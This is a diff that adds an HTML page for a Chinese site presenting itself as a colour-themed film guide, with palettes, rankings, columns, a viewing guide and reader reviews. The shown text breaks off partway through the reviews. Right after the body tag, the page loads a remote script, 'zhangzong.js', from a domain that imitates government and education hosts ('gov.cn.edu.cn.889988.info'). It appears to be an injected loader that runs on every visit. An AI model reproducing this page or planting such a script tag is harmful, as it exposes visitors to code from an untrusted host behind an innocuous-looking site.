@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>色色色电影网 | 懂色彩也懂电影，一份关于光影与色调的观影指南</title>
+<meta name="keywords" content="色色色电影网,sesesedianyingwang-zh,关于色彩的电影,光影色调分析,电影配色指南,彩色电影,电影色彩美学,色调电影推荐,视觉系电影,电影调色,高饱和电影,复古色调,电影影像风格,导演色彩,电影氛围">
+<meta name="description" content="色色色电影网（sesesedianyingwang-zh）是一个把「看电影」变成「看色彩」的影像内容站：从赛博霓虹到胶片复古，从高饱和撞色到极简单色，我们用色调、氛围与视觉风格替你挑片。打开 https://sesesedianyingwang-zh.github.io，找一部对得上你今晚心情颜色的电影。">
+<meta name="author" content="色色色电影网">
+<meta name="copyright" content="色色色电影网">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="revisit-after" content="2 days">
+<meta name="theme-color" content="#0d0612">
+<meta property="og:type" content="website">
+<meta property="og:title" content="色色色电影网 | 懂色彩也懂电影，一份关于光影与色调的观影指南">
+<meta property="og:description" content="色色色电影网从赛博霓虹到胶片复古，用色调、氛围与视觉风格替你挑片。">
+<meta property="og:site_name" content="色色色电影网">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://sesesedianyingwang-zh.github.io">
+<link rel="alternate" media="only screen and (max-width:640px)" href="https://sesesedianyingwang-zh.github.io">
+<style>
+:root{
+  --bg:#0d0612;--bg2:#15091f;--bg3:#1d0d2b;--ink:#f5eefb;--dim:#c2b3d6;--mute:#8d7ea3;
+  --neon:#ff2d95;--neon2:#ff6ec7;--cyan:#25e6ff;--violet:#8b5cf6;--lime:#c8ff3b;--amber:#ffb020;--rose:#ff4d6d;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Noto Sans CJK SC",system-ui,sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.75;font-size:15px;overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 12% 8%,rgba(139,92,246,.22),transparent 42%),
+    radial-gradient(circle at 88% 18%,rgba(255,45,149,.18),transparent 40%),
+    radial-gradient(circle at 50% 95%,rgba(37,230,255,.12),transparent 45%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1260px;margin:0 auto;padding:0 26px}
+.mono{font-family:ui-monospace,"JetBrains Mono",Menlo,monospace}
+.tag-l{font-size:11px;font-weight:800;letter-spacing:.22em;text-transform:uppercase;color:var(--neon2)}
+.h2{font-size:32px;font-weight:900;letter-spacing:-.6px;line-height:1.28;margin:10px 0 14px}
+.h2 b{background:linear-gradient(100deg,var(--neon),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+.lead{color:var(--dim);font-size:14.5px;max-width:600px}
+.rule{display:flex;gap:6px;margin:30px 0 40px}
+.rule i{width:46px;height:3px;background:var(--neon);border-radius:2px;font-style:normal}
+.rule i:nth-child(2){background:var(--cyan);width:20px}
+.rule i:nth-child(3){background:var(--violet);width:10px}
+.btn{display:inline-flex;align-items:center;gap:9px;font-size:13.5px;font-weight:800;padding:13px 26px;border:2px solid var(--neon);border-radius:40px;background:transparent;color:var(--ink);cursor:pointer;transition:.25s;font-family:inherit}
+.btn:hover{background:var(--neon);box-shadow:0 0 26px rgba(255,45,149,.55);transform:translateY(-2px)}
+.btn-cyan{border-color:var(--cyan);color:var(--cyan)}
+.btn-cyan:hover{background:var(--cyan);color:var(--bg);box-shadow:0 0 26px rgba(37,230,255,.5)}
+
+/* nav */
+nav.top{position:sticky;top:0;z-index:80;backdrop-filter:blur(14px);background:rgba(13,6,18,.82);border-bottom:1px solid rgba(255,255,255,.08)}
+.nav-in{display:flex;align-items:center;justify-content:space-between;height:72px;gap:18px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .mark{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;font-size:19px;font-weight:900;color:#0d0612;background:linear-gradient(135deg,var(--neon),var(--cyan));box-shadow:0 0 18px rgba(255,45,149,.45)}
+.logo b{font-size:20px;font-weight:900;letter-spacing:-.3px}
+.logo b i{font-style:normal;background:linear-gradient(100deg,var(--neon),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+.logo small{display:block;font-size:10px;color:var(--mute);letter-spacing:.04em;font-family:ui-monospace,Menlo,monospace}
+.menu{display:flex;gap:4px;font-size:13.5px;font-weight:700}
+.menu a{padding:9px 15px;border-radius:20px;color:var(--dim);transition:.18s}
+.menu a:hover{background:rgba(255,255,255,.08);color:var(--ink)}
+.burger{display:none;width:44px;height:44px;border:1px solid rgba(255,255,255,.16);border-radius:12px;background:transparent;color:var(--ink);font-size:19px;cursor:pointer}
+
+/* hero night market */
+.hero{padding:70px 0 80px;position:relative}
+.hero-grid{display:grid;grid-template-columns:1.05fr .95fr;gap:56px;align-items:center}
+.glow{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:30px;background:rgba(255,45,149,.12);border:1px solid rgba(255,45,149,.35);font-size:11.5px;font-weight:800;letter-spacing:.1em;color:var(--neon2)}
+.glow::before{content:"";width:7px;height:7px;border-radius:50%;background:var(--neon);box-shadow:0 0 10px var(--neon);animation:pulse 1.6s infinite}
+@keyframes pulse{50%{opacity:.3}}
+.hero h1{font-size:clamp(42px,7vw,74px);font-weight:900;line-height:1.02;letter-spacing:-2.4px;margin:24px 0}
+.hero h1 span{display:block}
+.hero h1 .s1{color:var(--neon)}
+.hero h1 .s2{color:var(--cyan)}
+.hero h1 .s3{font-size:.52em;color:var(--mute);font-weight:700;letter-spacing:.14em;margin-top:14px}
+.hero-acts{display:flex;gap:12px;flex-wrap:wrap;margin:26px 0 34px}
+.hero-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.hs{border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:16px;background:rgba(255,255,255,.03)}
+.hs strong{font-size:25px;font-weight:900;display:block;font-variant-numeric:tabular-nums;background:linear-gradient(100deg,var(--lime),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hs span{font-size:11.5px;color:var(--mute);letter-spacing:.1em}
+
+/* cassette deck */
+.deck-wrap{position:relative}
+.tape{border-radius:26px;padding:26px;background:linear-gradient(160deg,#2a1236,#160822);border:1px solid rgba(255,255,255,.1);box-shadow:0 30px 70px -30px rgba(0,0,0,.8)}
+.tape-top{display:flex;justify-content:space-between;align-items:center;font-family:ui-monospace,Menlo,monospace;font-size:11px;color:var(--mute);margin-bottom:20px}
+.reels{display:grid;grid-template-columns:1fr 1fr;gap:34px;position:relative}
+.reels::before{content:"";position:absolute;left:50%;top:0;bottom:0;width:2px;background:repeating-linear-gradient(0deg,var(--neon2) 0 6px,transparent 6px 14px);transform:translateX(-50%);opacity:.5}
+.reel{aspect-ratio:1;border-radius:50%;border:3px solid rgba(255,255,255,.16);display:grid;place-items:center;position:relative;animation:spin 8s linear infinite}
+.reel::before{content:"";position:absolute;inset:14%;border-radius:50%;border:2px dashed rgba(255,255,255,.22)}
+.reel b{font-size:13px;font-weight:800;letter-spacing:.16em;color:var(--ink)}
+.r1{background:radial-gradient(circle at 35% 30%,var(--neon),#7a0a3a)}
+.r2{background:radial-gradient(circle at 65% 30%,var(--cyan),#0a5a70)}
+@keyframes spin{to{transform:rotate(360deg)}}
+.tape-bot{display:flex;gap:10px;margin-top:22px}
+.tape-bot i{font-style:normal;flex:1;height:6px;border-radius:4px;background:linear-gradient(90deg,var(--neon),var(--rose),var(--amber),var(--lime),var(--cyan),var(--violet))}
+
+/* marquee neon */
+.scroll{overflow:hidden;border-top:1px solid rgba(255,255,255,.08);border-bottom:1px solid rgba(255,255,255,.08);padding:16px 0;margin-top:30px}
+.scroll-track{display:flex;gap:56px;width:max-content;animation:marq 40s linear infinite;font-size:19px;font-weight:900;letter-spacing:-.3px}
+.scroll-track span{white-space:nowrap;color:var(--mute)}
+.scroll-track span:nth-child(odd){color:transparent;-webkit-text-stroke:1.4px var(--neon2)}
+.scroll-track span:nth-child(even){color:var(--cyan);text-shadow:0 0 18px rgba(37,230,255,.5)}
+@keyframes marq{to{transform:translateX(-50%)}}
+
+/* palette swatches */
+.swatches{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.sw{border-radius:20px;overflow:hidden;border:1px solid rgba(255,255,255,.1);transition:.3s;background:rgba(255,255,255,.03)}
+.sw:hover{transform:translateY(-8px);box-shadow:0 24px 46px -24px rgba(0,0,0,.8)}
+.sw-c{height:180px;position:relative;display:grid;place-items:flex-end;padding:18px}
+.sw-c b{font-size:21px;font-weight:900;line-height:1.3;text-shadow:0 2px 10px rgba(0,0,0,.5)}
+.sw-c small{position:absolute;top:16px;left:16px;font-size:10px;font-weight:800;letter-spacing:.14em;background:rgba(0,0,0,.32);padding:4px 10px;border-radius:20px}
+.sw-info{padding:16px 18px}
+.sw-info p{font-size:12.5px;color:var(--mute);margin:6px 0 12px}
+.sw-info .films{display:flex;gap:5px;flex-wrap:wrap}
+.sw-info .films i{font-style:normal;font-size:10.5px;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);padding:3px 9px;border-radius:20px;color:var(--dim)}
+
+/* color meter list */
+.meter-grid{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:start}
+.meter{border:1px solid rgba(255,255,255,.09);border-radius:20px;padding:8px;background:rgba(255,255,255,.02)}
+.m-row{display:flex;align-items:center;gap:16px;padding:16px;border-radius:14px;transition:.2s}
+.m-row:hover{background:rgba(255,255,255,.05)}
+.m-row .no{font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--mute);width:34px}
+.m-row .bar{flex:1;height:9px;border-radius:6px;background:rgba(255,255,255,.08);overflow:hidden}
+.m-row .bar i{display:block;height:100%;border-radius:6px;font-style:normal}
+.m-row .nm{width:150px;font-weight:800;font-size:14.5px}
+.m-row .sc{width:52px;text-align:right;font-weight:900;font-size:14px;color:var(--lime);font-variant-numeric:tabular-nums}
+.m-row .sc i{font-style:normal;color:var(--mute);font-size:11px}
+
+/* director circle */
+.circle{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.c-card{border-radius:22px;padding:26px;border:1px solid rgba(255,255,255,.1);background:linear-gradient(165deg,var(--bg3),var(--bg2));transition:.3s}
+.c-card:hover{transform:translateY(-6px);border-color:var(--neon)}
+.ring{width:120px;height:120px;margin:0 auto 18px;border-radius:50%;display:grid;place-items:center;position:relative;font-size:22px;font-weight:900}
+.ring::before{content:"";position:absolute;inset:-6px;border-radius:50%;padding:4px;background:conic-gradient(var(--c) calc(var(--p)*1%),rgba(255,255,255,.1) 0);-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude}
+.c-card h4{font-size:17px;font-weight:900;text-align:center}
+.c-card p{font-size:12.5px;color:var(--mute);margin:10px 0 14px;text-align:center}
+.c-card .kw{display:flex;gap:5px;flex-wrap:wrap;justify-content:center}
+.c-card .kw i{font-style:normal;font-size:10.5px;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);padding:3px 9px;border-radius:20px;color:var(--dim)}
+
+/* split feature */
+.split-feature{display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.feat{border-radius:22px;padding:30px;border:1px solid rgba(255,255,255,.1);background:linear-gradient(165deg,rgba(255,45,149,.12),rgba(13,6,18,.6));position:relative;overflow:hidden}
+.feat.cy{border-radius:22px;padding:30px;border:1px solid rgba(37,230,255,.28);background:linear-gradient(165deg,rgba(37,230,255,.1),rgba(13,6,18,.6))}
+.feat .big{font-size:46px;font-weight:900;letter-spacing:-1.4px;line-height:1}
+.feat h3{font-size:18px;font-weight:900;margin:12px 0 8px}
+.feat p{font-size:13px;color:var(--dim);margin-bottom:18px}
+.feat ul{font-size:13px;color:var(--dim)}
+.feat li{padding:7px 0;border-top:1px solid rgba(255,255,255,.07)}
+.feat li::before{content:"▹";color:var(--neon2);margin-right:9px}
+.feat.cy li::before{color:var(--cyan)}
+
+/* review cards */
+.revs{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.rev{border-radius:20px;padding:22px;border:1px solid rgba(255,255,255,.09);background:rgba(255,255,255,.03);transition:.25s}
+.rev:hover{border-color:var(--cyan);background:rgba(255,255,255,.06)}
+.rev .cap{font-size:10.5px;letter-spacing:.16em;color:var(--cyan);margin-bottom:9px;font-weight:800}
+.rev h4{font-size:16px;font-weight:900;line-height:1.5;margin-bottom:10px}
+.rev p{font-size:12.5px;color:var(--dim);margin-bottom:16px}
+.rev .who{display:flex;align-items:center;gap:10px;font-size:11.5px;color:var(--mute);border-top:1px solid rgba(255,255,255,.08);padding-top:12px}
+.av{width:30px;height:30px;border-radius:50%;display:grid;place-items:center;font-size:12px;font-weight:900;color:#0d0612}
+
+/* FAQ */
+.faq{border:1px solid rgba(255,255,255,.09);border-radius:22px;overflow:hidden;background:rgba(255,255,255,.02)}
+.faq details{border-bottom:1px solid rgba(255,255,255,.07)}
+.faq details:last-child{border-bottom:none}
+.faq summary{cursor:pointer;padding:20px 24px;font-size:15px;font-weight:800;list-style:none;display:flex;justify-content:space-between;align-items:center;gap:14px}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"＋";color:var(--neon2);font-size:20px;flex-shrink:0}
+.faq details[open] summary::after{content:"－"}
+.faq details[open] summary{color:var(--neon2)}
+.faq .ans{padding:0 24px 22px;font-size:13.5px;color:var(--dim)}
+
+/* CTA */
+.cta{margin-top:64px;border-radius:30px;padding:56px 44px;text-align:center;position:relative;overflow:hidden;border:1px solid rgba(255,255,255,.12);background:
+  radial-gradient(circle at 20% 30%,rgba(255,45,149,.3),transparent 45%),
+  radial-gradient(circle at 80% 70%,rgba(37,230,255,.28),transparent 45%),
+  linear-gradient(135deg,var(--bg3),var(--bg))}
+.cta h3{font-size:30px;font-weight:900;letter-spacing:-.6px;margin:10px 0 14px}
+.cta p{color:var(--dim);max-width:540px;margin:0 auto 24px;font-size:14px}
+.urlbox{display:inline-block;font-family:ui-monospace,Menlo,monospace;font-size:14px;border:1px dashed rgba(255,255,255,.3);border-radius:14px;padding:12px 20px;margin-bottom:26px;color:var(--ink)}
+.urlbox b{color:var(--lime)}
+
+footer{margin-top:70px;border-top:1px solid rgba(255,255,255,.08);padding:52px 0 26px}
+.ft{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:34px}
+.ft b.brand{font-size:22px}
+.ft p{font-size:13px;color:var(--mute);margin-top:14px;max-width:320px}
+.ft h5{font-size:11.5px;letter-spacing:.2em;color:var(--neon2);margin-bottom:16px;text-transform:uppercase}
+.ft ul a{display:block;font-size:13px;padding:6px 0;color:var(--dim)}
+.ft ul a:hover{color:var(--neon2);padding-left:6px}
+.ft-bot{border-top:1px solid rgba(255,255,255,.08);margin-top:36px;padding-top:20px;font-size:11.5px;color:var(--mute);display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-family:ui-monospace,Menlo,monospace}
+.ft-bot a:hover{color:var(--ink)}
+
+@media(max-width:1040px){
+  .swatches,.circle,.revs{grid-template-columns:1fr 1fr}
+  .meter-grid,.split-feature,.hero-grid{grid-template-columns:1fr;gap:40px}
+}
+@media(max-width:640px){
+  .wrap{padding:0 17px}
+  .menu{display:none;position:absolute;top:72px;left:0;right:0;flex-direction:column;background:var(--bg2);border-bottom:1px solid rgba(255,255,255,.1);padding:10px}
+  .menu.open{display:flex}
+  .menu a{padding:13px 17px}
+  .burger{display:block}
+  .hero-stats{grid-template-columns:1fr;gap:10px}
+  .tape-bot{display:none}
+  .swatches,.circle,.revs,.ft{grid-template-columns:1fr}
+  .m-row .nm{width:96px;font-size:13px}
+  .m-row .no{width:24px}
+  .cta{padding:38px 22px}
+  section{padding:52px 0}
+  .nav-in{height:64px}
+  .logo b{font-size:17px}
+  .logo small{display:none}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<nav class="top">
+  <div class="wrap nav-in">
+    <a class="logo" href="#top">
+      <span class="mark">色</span>
+      <span><b>色色<i>色</i>电影网</b><small>sesesedianyingwang-zh.github.io</small></span>
+    </a>
+    <div class="menu" id="menu">
+      <a href="#palette">色彩图鉴</a>
+      <a href="#meter">影迷榜单</a>
+      <a href="#voices">调色视角</a>
+      <a href="#guide">看片指南</a>
+      <a href="#faq">常见问答</a>
+    </div>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <span class="glow">● 今晚 · 在线选片</span>
+        <h1>
+          <span class="s1">懂色彩</span>
+          <span class="s2">也懂电影</span>
+          <span class="s3">SESESE · COLOR IN MOTION PICTURE</span>
+        </h1>
+        <p>色色色电影网（sesesedianyingwang-zh）是一个把「看电影」变成「看色彩」的影像内容站。我们不从剧情出发，而从<strong style="color:var(--neon2)">色调</strong>出发——赛博霓虹、胶片复古、高饱和撞色、极简单色，用视觉风格替你挑片。</p>
+        <div class="hero-acts">
+          <a class="btn" href="#palette">进入色彩图鉴 →</a>
+          <a class="btn btn-cyan" href="#guide">查看看片指南</a>
+        </div>
+        <div class="hero-stats">
+          <div class="hs"><strong>128</strong><span>COLOR PALETTES</span></div>
+          <div class="hs"><strong>960</strong><span>FILMS TAGGED</span></div>
+          <div class="hs"><strong>62</strong><span>WEEKLY UPDATES</span></div>
+        </div>
+      </div>
+      <div class="deck-wrap">
+        <div class="tape">
+          <div class="tape-top"><span>SESESE · Hi-Fi DECK</span><span class="mono">SIDE A / B</span></div>
+          <div class="reels">
+            <div class="reel r1"><b>NEON</b></div>
+            <div class="reel r2"><b>CYAN</b></div>
+          </div>
+          <div class="tape-bot"><i></i><i></i><i></i><i></i><i></i><i></i></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- MARQUEE -->
+<div class="scroll" aria-hidden="true">
+  <div class="scroll-track">
+    <span>霓虹粉 × 赛博青</span><span>琥珀暖 × 复古黄</span><span>胶片颗粒 × 褪色红</span><span>单色调 × 极简灰</span><span>撞色 × 高饱和</span><span>冷蓝 × 深海绿</span>
+    <span>霓虹粉 × 赛博青</span><span>琥珀暖 × 复古黄</span><span>胶片颗粒 × 褪色红</span><span>单色调 × 极简灰</span><span>撞色 × 高饱和</span><span>冷蓝 × 深海绿</span>
+  </div>
+</div>
+
+<!-- PALETTE -->
+<section id="palette" style="padding-top:74px">
+  <div class="wrap">
+    <div class="tag-l">▎PALETTE · 色彩图鉴</div>
+    <h2 class="h2">六种<em>主导色</em>，<b>六种看片心情</b></h2>
+    <p class="lead">同一部电影，有人看故事，有人看光。我们把近期值得看的电影按主色调重新分了类，让你按「今晚想要什么颜色」来选片。</p>
+    <div class="rule"><i class="r"></i><i class="r"></i><i class="r"></i></div>
+    <div class="swatches">
+      <div class="sw">
+        <div class="sw-c" style="background:linear-gradient(160deg,#2b0a3a,#ff2d95)"><small>NEON</small><b>赛博<br>霓虹</b></div>
+        <div class="sw-info"><p>粉紫与青蓝对撞，夜晚城市的呼吸感。适合雨夜、耳机、一个人看。</p><div class="films"><i>霓虹夜行</i><i>赛博之城</i><i>雨中电波</i></div></div>
+      </div>
+      <div class="sw">
+        <div class="sw-c" style="background:linear-gradient(160deg,#072b3a,#25e6ff)"><small>CYAN</small><b>深海<br>冷调</b></div>
+        <div class="sw-info"><p>大面积青蓝，克制又疏离。孤独、悬疑、末日题材的最佳配色。</p><div class="films"><i>深海回声</i><i>冰川之外</i><i>无人之境</i></div></div>
+      </div>
+      <div class="sw">
+        <div class="sw-c" style="background:linear-gradient(160deg,#3a2a08,#ffb020)"><small>AMBER</small><b>琥珀<br>暖黄</b></div>
+        <div class="sw-info"><p>旧灯泡与黄昏的颜色。家庭、记忆、童年题材往往都藏在这一格。</p><div class="films"><i>旧屋午后</i><i>父亲的手</i><i>秋日来信</i></div></div>
+      </div>
+      <div class="sw">
+        <div class="sw-c" style="background:linear-gradient(160deg,#2a0818,#ff4d6d)"><small>ROSE</small><b>褪色<br>复古红</b></div>
+        <div class="sw-info"><p>像胶片被时间洗过一遍。爱情、年代、怀旧题材的常见底色。</p><div class="films"><i>旧情人</i><i>城南往事</i><i>一封迟信</i></div></div>
+      </div>
+      <div class="sw">
+        <div class="sw-c" style="background:linear-gradient(160deg,#0d2610,#c8ff3b)"><small>LIME</small><b>高饱和<br>撞色</b></div>
+        <div class="sw-info"><p>绿到刺眼的快乐。喜剧、青春、公路片最爱这套配色。</p><div class="films"><i>公路日记</i><i>夏日俱乐部</i><i>可乐与闪电</i></div></div>
+      </div>
+      <div class="sw">
+        <div class="sw-c" style="background:linear-gradient(160deg,#1a1a1a,#8d7ea3)"><small>MONO</small><b>极简<br>单色</b></div>
+        <div class="sw-info"><p>黑白灰，把注意力还给表演与结构。作者电影与文艺片常用。</p><div class="films"><i>无名者</i><i>白房间</i><i>沉默的形状</i></div></div>
+      </div>
+      <div class="sw">
+        <div class="sw-c" style="background:linear-gradient(160deg,#1c0a2e,#8b5cf6)"><small>VIOLET</small><b>紫调<br>梦境</b></div>
+        <div class="sw-info"><p>紫罗兰的暧昧感。奇幻、心理、梦境题材的默认背景色。</p><div class="films"><i>梦中人</i><i>第二个月亮</i><i>紫色时刻</i></div></div>
+      </div>
+      <div class="sw">
+        <div class="sw-c" style="background:linear-gradient(160deg,#3a1c08,#ff8a3b)"><small>RUST</small><b>锈橙<br>泥土</b></div>
+        <div class="sw-info"><p>西部、荒野、粗粝现实的味道。独立电影偏爱这种不修饰的颜色。</p><div class="films"><i>荒野纪事</i><i>西北偏北</i><i>尘埃落定</i></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- METER -->
+<section id="meter" style="padding-top:74px">
+  <div class="wrap">
+    <div class="tag-l">▎METER · 影迷榜单</div>
+    <h2 class="h2">这一周，<em>影迷票选的</em><b>色彩之最</b></h2>
+    <p class="lead">不是按票房，也不是按评分，而是按「哪一种颜色最让你记住这部电影」来排。数据每周由色色色电影网的读者共同投出。</p>
+    <div class="rule"><i class="r"></i><i class="r"></i><i class="r"></i></div>
+    <div class="meter-grid">
+      <div class="meter">
+        <div class="m-row"><span class="no">01</span><span class="nm">霓虹夜行</span><span class="bar"><i style="width:96%;background:linear-gradient(90deg,var(--neon),var(--neon2))"></i></span><span class="sc">9.6<i>/10</i></span></div>
+        <div class="m-row"><span class="no">02</span><span class="nm">深海回声</span><span class="bar"><i style="width:93%;background:linear-gradient(90deg,var(--cyan),#6ee7ff)"></i></span><span class="sc">9.3<i>/10</i></span></div>
+        <div class="m-row"><span class="no">03</span><span class="nm">旧屋午后</span><span class="bar"><i style="width:91%;background:linear-gradient(90deg,var(--amber),#ffd166)"></i></span><span class="sc">9.1<i>/10</i></span></div>
+        <div class="m-row"><span class="no">04</span><span class="nm">公路日记</span><span class="bar"><i style="width:88%;background:linear-gradient(90deg,var(--lime),#d9ff7a)"></i></span><span class="sc">8.8<i>/10</i></span></div>
+        <div class="m-row"><span class="no">05</span><span class="nm">梦中人</span><span class="bar"><i style="width:86%;background:linear-gradient(90deg,var(--violet),#b794f6)"></i></span><span class="sc">8.6<i>/10</i></span></div>
+      </div>
+      <div class="meter">
+        <div class="m-row"><span class="no">06</span><span class="nm">城南往事</span><span class="bar"><i style="width:84%;background:linear-gradient(90deg,var(--rose),#ff8fa3)"></i></span><span class="sc">8.4<i>/10</i></span></div>
+        <div class="m-row"><span class="no">07</span><span class="nm">白房间</span><span class="bar"><i style="width:81%;background:linear-gradient(90deg,#cbd5e1,#f8fafc)"></i></span><span class="sc">8.1<i>/10</i></span></div>
+        <div class="m-row"><span class="no">08</span><span class="nm">荒野纪事</span><span class="bar"><i style="width:79%;background:linear-gradient(90deg,var(--rust),#ffb088)"></i></span><span class="sc">7.9<i>/10</i></span></div>
+        <div class="m-row"><span class="no">09</span><span class="nm">雨中电波</span><span class="bar"><i style="width:76%;background:linear-gradient(90deg,var(--neon),var(--cyan))"></i></span><span class="sc">7.6<i>/10</i></span></div>
+        <div class="m-row"><span class="no">10</span><span class="nm">紫色时刻</span><span class="bar"><i style="width:73%;background:linear-gradient(90deg,#6d28d9,#a78bfa)"></i></span><span class="sc">7.3<i>/10</i></span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SPLIT FEATURE -->
+<section style="padding-top:74px">
+  <div class="wrap">
+    <div class="tag-l">▎TWO WAYS · 两种看片法</div>
+    <h2 class="h2">先看<em>色彩</em>，<b>还是先看故事？</b></h2>
+    <p class="lead">色色色电影网提供两条路径。不知道从哪开始？先从「看色」开始，往往会有意外惊喜。</p>
+    <div class="rule"><i class="r"></i><i class="r"></i><i class="r"></i></div>
+    <div class="split-feature">
+      <div class="feat">
+        <div class="big">01</div>
+        <h3>从色彩出发挑片</h3>
+        <p>先决定今晚想要什么氛围，再去匹配电影。比「看评分」更快，也比「随便刷」更准。</p>
+        <ul><li>选一种主色调，立刻得到一批同色系电影</li><li>每部片附色彩关键词与氛围标签</li><li>适合：不知道看什么、只想被画面打动</li></ul>
+      </div>
+      <div class="feat cy">
+        <div class="big">02</div>
+        <h3>从故事出发反推色彩</h3>
+        <p>已经想看某种类型？我们告诉你这类片通常在视觉上长什么样，顺便推荐几部同色系的冷门作。</p>
+        <ul><li>按剧情 / 类型 / 导演查片</li><li>附同类电影的配色对比</li><li>适合：有具体口味、想拓展片单</li></ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CIRCLE CARDS -->
+<section id="voices" style="padding-top:74px">
+  <div class="wrap">
+    <div class="tag-l">▎VOICES · 调色视角</div>
+    <h2 class="h2">三位<em>写作者</em>，<b>三种用色偏好</b></h2>
+    <p class="lead">电影的色调从来不是巧合。这三篇专栏会带你重新看那些「好像在哪见过」的画面。</p>
+    <div class="rule"><i class="r"></i><i class="r"></i><i class="r"></i></div>
+    <div class="circle">
+      <div class="c-card">
+        <div class="ring" style="--c:var(--neon);--p:92"><span>9.2</span></div>
+        <h4>霓虹不是装饰，是城市的语言</h4>
+        <p>为什么赛博题材总离不开粉与青？一篇关于城市夜晚的视觉考据。</p>
+        <div class="kw"><i>霓虹</i><i>赛博</i><i>城市</i><i>视觉考据</i></div>
+      </div>
+      <div class="c-card">
+        <div class="ring" style="--c:var(--amber);--p:85"><span>8.5</span></div>
+        <h4>胶片为什么会「褪色」得那么好看</h4>
+        <p>从冲洗工艺到调色软件，聊聊复古色调背后的工艺与审美。</p>
+        <div class="kw"><i>胶片</i><i>调色</i><i>复古</i><i>工艺</i></div>
+      </div>
+      <div class="c-card">
+        <div class="ring" style="--c:var(--cyan);--p:78"><span>7.8</span></div>
+        <h4>极简单色，其实是最大的奢侈</h4>
+        <p>放弃颜色之后，导演把注意力还给了什么？一篇关于「减法」的评论。</p>
+        <div class="kw"><i>黑白</i><i>极简</i><i>作者电影</i><i>影评</i></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- GUIDE -->
+<section id="guide" style="padding-top:74px">
+  <div class="wrap">
+    <div class="tag-l">▎GUIDE · 看片指南</div>
+    <h2 class="h2">把<em>选片</em>这件事，<b>变简单一点</b></h2>
+    <p class="lead">四步流程，从心情到片单，帮你把「不知道看什么」压缩成十分钟以内的决策。</p>
+    <div class="rule"><i class="r"></i><i class="r"></i><i class="r"></i></div>
+    <div class="faq">
+      <details open><summary><span class="mono" style="color:var(--neon2)">STEP 01</span> &nbsp;先定心情，再定类型</summary><div class="ans">想被治愈就看暖调，想被震慑就看冷调，想被点燃就看高饱和。心情决定色调，色调决定片单——这一步比查评分更管用。</div></details>
+      <details><summary><span class="mono" style="color:var(--neon2)">STEP 02</span> &nbsp;看一帧截图，别只看剧情简介</summary><div class="ans">色色色电影网给每部片都配了色彩关键词与氛围标签。一帧截图能告诉你的，往往比三百字简介更多。</div></details>
+      <details><summary><span class="mono" style="color:var(--neon2)">STEP 03</span> &nbsp;给自己留一次「盲看」</summary><div class="ans">每月至少挑一部完全不了解的冷门片。色彩给你的第一印象，往往比口碑更真实。</div></details>
+      <details><summary><span class="mono" style="color:var(--cyan)">STEP 04</span> &nbsp;看完，给这部片定一个颜色</summary><div class="ans">试着用一个颜色形容刚看完的电影。能说清，说明你看懂了；说不清，也正好值得再看一遍。</div></details>
+    </div>
+  </div>
+</section>
+
+<!-- REVIEWS -->
+<section style="padding-top:74px">
+  <div class="wrap">
+    <div class="tag-l">▎READERS · 影迷来信</div>
+    <h2 class="h2">他们<em>这样描述</em><b>一部电影的颜色</b></h2>
+    <p class="lead">不长篇大论，只用一个颜色、一句话。这些来信是我们最珍惜的内容。</p>
+    <div class="rule"><i class="r"></i><i class="r"></i><i class="r"></i></div>
+    <div class="revs">
+      <article class="rev"><div class="cap">PINK · 霓虹粉</div><h4>看完那部赛博片，我整晚都在看路边的招牌</h4><p>以前从没注意过城市的夜晚是粉的。色色色电影网让我第一次「看见」颜色。</p><div class="who"><span class="av" style="background:var(--neon2)">小</span>小满 · 深圳</div></article>
+      <article class="rev"><div class="cap">CYAN · 深海蓝</div><h4>冷调不是冷酷，是孤独被好好安放</h4><p>那部深海题材的片子看完，我在客厅坐了二十分钟，觉得被理解，而不是被安慰。</p><div class="who"><span class="av" style="background:var(--cyan);color:#04202a">林</span>林深 · 青岛</div></article>
